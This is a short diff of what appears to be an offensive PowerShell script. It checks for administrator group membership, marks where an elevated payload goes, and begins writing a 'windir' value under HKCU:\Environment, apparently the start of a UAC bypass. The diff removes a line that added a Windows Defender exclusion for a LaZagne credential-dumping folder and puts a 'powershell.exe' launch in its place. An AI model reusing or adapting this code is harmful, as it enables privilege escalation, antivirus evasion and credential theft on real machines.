@@ -1,7 +1,7 @@
 if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
     #Payload goes here
     #It'll run as Administrator
-    Add-MpPreference -ExclusionPath "C:\Users\Carter\Desktop\LaZagne"
+    powershell.exe
 } else {
     $registryPath = "HKCU:\Environment"
     $Name = "windir"
